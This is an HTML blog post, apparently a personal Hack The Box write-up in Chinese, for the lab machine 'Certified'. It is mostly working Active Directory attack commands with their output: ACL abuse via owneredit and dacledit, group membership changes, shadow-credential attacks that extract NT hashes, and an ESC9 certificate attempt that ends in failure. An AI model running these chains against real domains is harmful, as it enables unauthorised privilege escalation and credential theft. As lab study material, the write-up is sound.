@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Certified is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the management_svc account, ACL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Certified">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/11/10/Certified/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="Certified is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the management_svc account, ACL">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/10/Certified/1.png">
+<meta property="article:published_time" content="2025-11-10T06:09:36.000Z">
+<meta property="article:modified_time" content="2025-11-13T12:27:43.656Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/11/10/Certified/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/11/10/Certified/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/11/10/Certified/","path":"2025/11/10/Certified/","title":"Certified"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Certified | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-docs"><a href="/docs/" rel="section"><i class="fa fa-book fa-fw"></i>Docs</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-number">1.2.</span> <span class="nav-text">SMB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bloodhound"><span class="nav-number">2.</span> <span class="nav-text">Bloodhound</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WriteOwner-Abuse"><span class="nav-number">2.1.</span> <span class="nav-text">WriteOwner Abuse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shadow-Credentials-attack"><span class="nav-number">2.2.</span> <span class="nav-text">Shadow Credentials attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Management-SVC-CA-Operator-Failed"><span class="nav-number">3.</span> <span class="nav-text">Shell as Management_SVC&#x2F;CA_Operator - Failed</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/11/10/Certified/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Certified | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Certified
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-11-10 14:09:36" itemprop="dateCreated datePublished" datetime="2025-11-10T14:09:36+08:00">2025-11-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-11-13 20:27:43" itemprop="dateModified" datetime="2025-11-13T20:27:43+08:00">2025-11-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Windows-Penetration-in-HTB/" itemprop="url" rel="index"><span itemprop="name">Windows Penetration in HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><code>Certified</code> is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the <code>management_svc</code> account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that <code>judith.mader</code> which has the <code>write owner</code> ACL over <code>management</code> group, management group has <code>GenericWrite</code> over the <code>management_svc</code> account where we can finally authenticate to the target using <code>WinRM</code> obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the <code>Administrator</code> account by abusing shadow credentials and <code>ESC9</code>.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>❯ sudo nmap -sCV 10.10.11.41
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-09 21:46 +0800
+Nmap scan report for 10.10.11.41 (10.10.11.41)
+Host is up (0.32s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 20:47:17Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:04:20
+|_Not valid after:  2105-05-23T21:04:20
+|_ssl-date: 2025-11-09T20:48:46+00:00; +6h59m58s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-09T20:48:46+00:00; +6h59m59s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:04:20
+|_Not valid after:  2105-05-23T21:04:20
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:04:20
+|_Not valid after:  2105-05-23T21:04:20
+|_ssl-date: 2025-11-09T20:48:47+00:00; +6h59m59s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-09T20:48:46+00:00; +6h59m59s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:04:20
+|_Not valid after:  2105-05-23T21:04:20
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>从上述ldap信息中我们可以确认 AD服务器域名是<code>certified.htb</code> 域控是<code>DC01.certified.htb</code> 同时有开53端口 域控确实也会兼DNS使用</p>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>最开始是看到了ldap 和smb的139端口 于是乎尝试使用netexec进行smb服务嗅探 <code>--shares</code>参数并没有发现什么有价值的东西 <code>--users</code>有发现一点</p>
+<pre><code>❯ netexec smb 10.10.11.41 -u &#39;judith.mader&#39; -p &#39;judith09&#39; --users
+SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
+SMB         10.10.11.41     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.10.11.41     445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain
+SMB         10.10.11.41     445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         10.10.11.41     445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account
+SMB         10.10.11.41     445    DC01             judith.mader                  2024-05-14 19:22:11 0
+SMB         10.10.11.41     445    DC01             management_svc                2024-05-13 15:30:51 0
+SMB         10.10.11.41     445    DC01             ca_operator                   2024-05-13 15:32:03 0
+SMB         10.10.11.41     445    DC01             alexander.huges               2024-05-14 16:39:08 0
+SMB         10.10.11.41     445    DC01             harry.wilson                  2024-05-14 16:39:37 0
+SMB         10.10.11.41     445    DC01             gregory.cameron               2024-05-14 16:40:05 0
+SMB         10.10.11.41     445    DC01             [*] Enumerated 9 local users: CERTIFIED
+</code></pre>
+<p>发现有两个用户值得注意一下 一个是<code>ca_operator</code>另一个是<code>krbtgt</code> 接下来就要解决如何从<code>judith</code>到他俩</p>
+<h1 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h1><pre><code>❯ bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: certified.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno 8] nodename nor servname provided, or not known
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 10 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.certified.htb
+INFO: Done in 01M 19S
+INFO: Compressing output into 20251110140720_bloodhound.zip
+</code></pre>
+<p>使用Bloodhound进行域分析 寻找到从<code>judith</code>到<code>ca_operator</code>路径 当然也可以一直点击<code>Outbound Object Control</code>寻找到<code>ca_operator</code>后再寻找路径</p>
+<p><img src="/2025/11/10/Certified/1.png"></p>
+<p>我们发现如下几点</p>
+<ul>
+<li><code>judith</code>对<code>management</code>组有WriteOwner权限 表明前者可以修改后者的所有者</li>
+<li><code>management</code>组对<code>management_svc</code>用户有GenericWrite权限 意味着可以写入任何属性</li>
+<li><code>management_svc</code>用户对<code>ca_operator</code>用户有GenericAll权限 意味着完全控制</li>
+</ul>
+<p>所以现在的目标清晰 先加入management组 bloodhound本身有WriteOwner权限滥用的poc(用impacket的) 但是我的mac不支持md4所以没法用</p>
+<pre><code>❯ owneredit.py -action write -new-owner &#39;judith.mader&#39; -target &#39;management&#39; &#39;certified&#39;/&#39;judith.mader&#39;:&#39;judith09&#39; -dc-ip 10.10.11.41
+...
+[-] unsupported hash type MD4
+</code></pre>
+<p>还好kali可以 接下来打一套组合拳</p>
+<h2 id="WriteOwner-Abuse"><a href="#WriteOwner-Abuse" class="headerlink" title="WriteOwner Abuse"></a>WriteOwner Abuse</h2><ul>
+<li>使用 certified 域的 judith.mader 账号（密码 judith09），通过域控制器 10.10.11.41，将 management 对象的所有者修改为 judith.mader 自己</li>
+</ul>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ impacket-owneredit -action write -new-owner &#39;judith.mader&#39; -target &#39;management&#39; &#39;certified&#39;/&#39;judith.mader&#39;:&#39;judith09&#39; -dc-ip 10.10.11.41
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+[*] OwnerSid modified successfully!
+</code></pre>
+<ul>
+<li>使用 certified 域的 judith.mader 账号（密码 judith09），通过域控制器 10.10.11.41，向 judith.mader 赋予对 management 对象的 WriteMembers 权限（即允许 judith.mader 修改 management 的成员）。</li>
+</ul>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ impacket-dacledit -action &#39;write&#39; -rights &#39;WriteMembers&#39; -principal &#39;judith.mader&#39; -target &#39;management&#39; &#39;certified&#39;/&#39;judith.mader&#39;:&#39;judith09&#39; -dc-ip 10.10.11.41
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] DACL backed up to dacledit-20251112-165644.bak
+[*] DACL modified successfully!
+</code></pre>
+<p>注意 bloodhound上给的是-target-dn 那个需要完整的DN格式 而-targer可以用简写 这里的简写为management 这个命令有可能执行不成功 可以用以下命令查看</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ impacket-dacledit -action read -target &#39;management&#39; &#39;certified&#39;/&#39;judith.mader&#39;:&#39;judith09&#39; -dc-ip 10.10.11.41
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Parsing DACL
+[*] Printing parsed DACL
+[*]   ACE[0] info
+[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+[*]     ACE flags                 : None
+[*]     Access mask               : ReadProperty, WriteProperty # pwned
+[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
+[*]     Trustee (SID)             : judith.mader (S-1-5-21-729746778-2675978091-3820388244-1103)
+</code></pre>
+<ul>
+<li>通过网络（SMB 协议）向 Windows 域中的 management 组添加成员 judith.mader</li>
+</ul>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ net rpc group addmem &quot;management&quot; &quot;judith.mader&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S 10.10.11.41
+
+┌──(kali㉿kali)-[~]
+└─$ net rpc group members &quot;management&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S 10.10.11.41
+CERTIFIED\judith.mader
+CERTIFIED\management_svc
+</code></pre>
+<h2 id="Shadow-Credentials-attack"><a href="#Shadow-Credentials-attack" class="headerlink" title="Shadow Credentials attack"></a>Shadow Credentials attack</h2><pre><code>┌──(kali㉿kali)-[~/Desktop/targetedKerberoast]
+└─$ python3 targetedKerberoast.py -v -d &#39;certified.htb&#39; -u &#39;judith.mader&#39; -p &#39;judith09&#39;
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre>
+<p>不知道为什么<code>Targeted kerberoast attack</code>老说时间差太大 那就换<code>Shadow Credentials attack</code></p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/pywhisker/pywhisker]
+└─$ python3 pywhisker.py -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p &quot;judith09&quot; --target &quot;management_svc&quot; --action &quot;add&quot;
+[*] Searching for the target account
+[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: f1ba22ce-463f-67f3-50a4-285a113ea68f
+[*] Updating the msDS-KeyCredentialLink attribute of management_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -&gt; PFX with cryptography: VE69zj7b.pfx
+[+] PFX exportiert nach: VE69zj7b.pfx
+[i] Passwort für PFX: 8mhSSs9ylJfNe4oQPh9P
+[+] Saved PFX (#PKCS12) certificate &amp; key at path: VE69zj7b.pfx
+[*] Must be used with password: 8mhSSs9ylJfNe4oQPh9P
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</code></pre>
+<p>不过可以使用<code>certipy</code>一条龙 历经千辛万苦 终于在faketime之后搞定了</p>
+<pre><code>┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ faketime &quot;$(ntpdate -q DC01.certified.htb | cut -d &#39; &#39; -f 1,2)&quot; certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Targeting user &#39;management_svc&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;d9749e38a07147d99df9152ecdba7f26&#39;
+[*] Adding Key Credential with device ID &#39;d9749e38a07147d99df9152ecdba7f26&#39; to the Key Credentials for &#39;management_svc&#39;
+[*] Successfully added Key Credential with device ID &#39;d9749e38a07147d99df9152ecdba7f26&#39; to the Key Credentials for &#39;management_svc&#39;
+[*] Authenticating as &#39;management_svc&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;management_svc@certified.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;management_svc.ccache&#39;
+[*] Wrote credential cache to &#39;management_svc.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;management_svc&#39;
+[*] Restoring the old Key Credentials for &#39;management_svc&#39;
+[*] Successfully restored the old Key Credentials for &#39;management_svc&#39;
+[*] NT hash for &#39;management_svc&#39;: a091c1832bcdd4677c28b5a6a1295584
+</code></pre>
+<p>其中这个faketime可以作为固定payload</p>
+<pre><code>┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ ntpdate -q DC01.certified.htb
+2025-11-13 07:12:07.931635 (+0800) +25199.660953 +/- 0.214397 DC01.certified.htb 10.10.11.41 s1 no-leap
+┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ ntpdate -q DC01.certified.htb | cut -d &#39; &#39; -f 1,2
+2025-11-13 07:12:13.654753
+</code></pre>
+<h1 id="Shell-as-Management-SVC-CA-Operator-Failed"><a href="#Shell-as-Management-SVC-CA-Operator-Failed" class="headerlink" title="Shell as Management_SVC&#x2F;CA_Operator - Failed"></a>Shell as Management_SVC&#x2F;CA_Operator - Failed</h1><p>试了各种办法 就是登不上他俩的winrm 即使已经获取了哈希</p>
+<pre><code>┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ faketime &quot;$(ntpdate -q DC01.certified.htb | cut -d &#39; &#39; -f 1,2)&quot; certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
+/home/kali/Desktop/red/certipy-venv/lib/python3.13/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user &#39;ca_operator&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;abff7c6d-105e-29f5-ab7b-89c625886ad2&#39;
+[*] Adding Key Credential with device ID &#39;abff7c6d-105e-29f5-ab7b-89c625886ad2&#39; to the Key Credentials for &#39;ca_operator&#39;
+[*] Successfully added Key Credential with device ID &#39;abff7c6d-105e-29f5-ab7b-89c625886ad2&#39; to the Key Credentials for &#39;ca_operator&#39;
+[*] Authenticating as &#39;ca_operator&#39; with the certificate
+[*] Using principal: ca_operator@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;ca_operator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;ca_operator&#39;
+[*] Restoring the old Key Credentials for &#39;ca_operator&#39;
+[*] Successfully restored the old Key Credentials for &#39;ca_operator&#39;
+[*] NT hash for &#39;ca_operator&#39;: b4b86f45c6018f1b664f70805f45d8f2
+</code></pre>
+<p>虽然登不上winrm 但是这个NT哈希还是可以继续使用的 再一次使用<code>certipy</code>以ca_operator用户凭据进行嗅探</p>
+<pre><code>┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
+...
+[!] Vulnerabilities
+      ESC9                              : &#39;CERTIFIED.HTB\\operator ca&#39; can enroll and template has no security extension
+</code></pre>
+<p>不过在利用漏洞时遇到了问题</p>
+<pre><code>┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
+/home/kali/Desktop/red/certipy-venv/lib/python3.13/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;ca_operator&#39;:
+    userPrincipalName                   : Administrator
+[*] Successfully updated &#39;ca_operator&#39;
+┌──(certipy-venv)─(kali㉿kali)-[~/Desktop/red]
+└─$ certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
+/home/kali/Desktop/red/certipy-venv/lib/python3.13/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: rpc_s_access_denied
+[-] Use -debug to print a stacktrace
+</code></pre>
+<p>上网搜了一下说是环境问题 只好就此作罢了 一直做着都感觉怪怪的 不过虽然没打通 还是学到了很多东西的</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/26/SteamCloud/" rel="prev" title="SteamCloud">
+                  <i class="fa fa-angle-left"></i> SteamCloud
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/" rel="next" title="Kerberos协议及攻击">
+                  Kerberos协议及攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
